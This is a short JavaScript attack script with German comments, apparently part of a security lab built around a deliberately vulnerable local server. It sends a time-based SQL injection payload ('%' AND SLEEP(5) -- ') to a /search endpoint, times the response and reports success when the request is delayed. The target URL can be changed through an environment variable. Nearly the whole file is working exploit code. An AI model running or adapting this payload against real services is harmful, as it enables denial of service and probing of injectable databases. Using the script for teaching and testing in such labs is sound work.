// =====================================================================
//  ANGRIFF 2.2 – VERFÜGBARKEIT
// =====================================================================
//  Ziel: den Dienst durch eine künstliche Verzögerung blockieren.
//  Der Payload schleust SLEEP(5) in die verwundbare /search-Abfrage ein.
//
//  Voraussetzung: der verwundbare Server läuft (npm run start:vulnerable).
//  Aufruf:        npm run attack:availability
// =====================================================================

const BASE_URL = process.env.TARGET_URL || 'http://127.0.0.1:3000';

async function run() {
  const term = `%' AND SLEEP(5) -- `;

  console.log('Payload:', term);

  try {
    const start = Date.now();

    const res = await fetch(
      `${BASE_URL}/search?term=${encodeURIComponent(term)}`,
    );

    const dauer = Date.now() - start;

    console.log(`Antwort nach ${dauer} ms, Status ${res.status}`);

    if (dauer >= 5000) {
      console.log('ERFOLG: Die SQL-Injection hat die Anfrage verzögert.');
    } else {
      console.log('Angriff nicht eindeutig nachgewiesen.');
    }
  } catch (err) {
    console.error('Anfrage fehlgeschlagen:', err.message);
    console.error(
      'Der Server ist möglicherweise durch den Verfügbarkeitsangriff nicht mehr erreichbar.',
    );
  }
}

run();
